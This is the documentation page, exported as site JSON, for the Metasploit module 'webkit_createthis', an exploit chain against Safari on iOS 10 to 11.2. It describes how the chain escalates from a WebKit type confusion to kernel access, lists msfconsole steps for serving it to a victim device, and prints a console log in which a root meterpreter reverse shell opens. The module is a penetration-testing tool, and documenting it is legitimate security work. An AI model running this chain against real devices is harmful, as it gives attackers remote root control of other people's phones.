{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/apple_ios/browser/webkit_createthis","result":{"data":{"moduleMetadataJson":{"id":"83c71cad-2a70-5fc9-a127-1ca135d92562","name":"Safari Webkit Proxy Object Type Confusion","fullname":"exploit/apple_ios/browser/webkit_createthis","description":"This module exploits a type confusion bug in the Javascript Proxy object in\n        WebKit. The DFG JIT does not take into account that, through the use of a Proxy,\n        it is possible to run arbitrary JS code during the execution of a CreateThis\n        operation. This makes it possible to change the structure of e.g. an argument\n        without causing a bailout, leading to a type confusion (CVE-2018-4233).\n\n          The type confusion leads to the ability to allocate fake Javascript objects,\n        as well as the ability to find the address in memory of a Javascript object.\n        This allows us to construct a fake JSCell object that can be used to read\n        and write arbitrary memory from Javascript.  The module then uses a ROP chain\n        to write the first stage shellcode into executable memory within the Safari\n        process and kick off its execution.\n\n          The first stage maps the second stage macho (containing CVE-2017-13861) into\n        executable memory, and jumps to its entrypoint. The CVE-2017-13861 async_wake\n        exploit leads to a kernel task port (TFP0) that can read and write arbitrary\n        kernel memory. The processes credential and sandbox structure in the kernel\n        is overwritten and the meterpreter payloads code signature hash is added to\n        the kernels trust cache, allowing Safari to load and execute the (self-signed)\n        meterpreter payload.","rank":0,"fields":{"detailsSlug":"/modules/details/exploit/apple_ios/browser/webkit_createthis","documentationSlug":"/modules/documentation/exploit/apple_ios/browser/webkit_createthis","referencesSlug":"/modules/references/exploit/apple_ios/browser/webkit_createthis"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>This module exploits a type confusion bug in the Javascript Proxy object in WebKit. The DFG JIT does not take into account that, through the use of a Proxy, it is possible to run arbitrary JS code during the execution of a CreateThis operation. This makes it possible to change the structure of e.g. an argument without causing a bailout, leading to a type confusion (CVE-2018-4233).  </p>\n<p>The type confusion leads to the ability to allocate fake Javascript objects, as well as the ability to find the address in memory of a Javascript object.  This allows us to construct a fake JSCell object that can be used to read and write arbitrary memory from Javascript.  The module then uses a ROP chain to write the first stage shellcode into executable memory within the Safari process and kick off its execution.  </p>\n<p>The first stage maps the second stage macho (containing CVE-2017-13861) into executable memory, and jumps to its entrypoint. The CVE-2017-13861 async_wake exploit leads to a kernel task port (TFP0) that can read and write arbitrary kernel memory. The processes credential and sandbox structure in the kernel is overwritten and the meterpreter payloads code signature hash is added to the kernels trust cache, allowing Safari to load and execute the (self-signed) meterpreter payload.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>The exploit should work all 64-bit devices (iPhone 5S and newer) running iOS 10 up to iOS 11.2.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ul>\n<li>Start msfconsole</li>\n<li><code class=\"language-text\">use exploit/apple_ios/browser/webkit_createthis</code></li>\n<li><code class=\"language-text\">set LHOST</code> and <code class=\"language-text\">SRVHOST</code> as appropriate</li>\n<li>exploit</li>\n<li>Browse to the given URL with a vulnerable device from Safari</li>\n<li>Note that the payload is specially created for this exploit, due to sandbox\nlimitations that prevent spawning new processes.</li>\n</ul>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"64bit-iphone-5s-running-ios-1021\" style=\"position:relative;\"><a href=\"#64bit-iphone-5s-running-ios-1021\" aria-label=\"64bit iphone 5s running ios 1021 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>64bit iPhone 5S running iOS 10.2.1</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(apple_ios/browser/webkit_createthis) &gt; exploit\n[*] Started reverse TCP handler on 192.168.1.51:4444 \n[*] Using URL: http://0.0.0.0:8080/\n[*] Local IP: http://192.168.1.51:8080/\n[*] Server started.\n[*] 192.168.1.34     webkit_createthis - Requesting / from Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1\n[*] 192.168.1.34     webkit_createthis - Requesting /exploit from Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1\n[+] 192.168.1.34     webkit_createthis - Sent async_wake exploit\n[+] 192.168.1.34     webkit_createthis - Sent sha1 iOS 10 payload\n[*] Meterpreter session 1 opened (192.168.1.51:4444 -&gt; 192.168.1.34:49211) at 2019-04-15 11:34:01 +0200\n\nmsf5 exploit(apple_ios/browser/webkit_createthis) &gt; sessions\n\nActive sessions\n===============\n\n  Id  Name  Type                           Information                                  Connection\n  --  ----  ----                           -----------                                  ----------\n  1         meterpreter aarch64/apple_ios  uid=0, gid=0, euid=0, egid=0 @ 192.168.1.34  192.168.1.51:4444 -&gt; 192.168.1.34:49211 (192.168.1.34)\n\nmsf5 exploit(apple_ios/browser/webkit_createthis) &gt; sessions 1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; pwd\n/System/Library/Frameworks/WebKit.framework/XPCServices/com.apple.WebKit.WebContent.xpc\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"83c71cad-2a70-5fc9-a127-1ca135d92562"}}}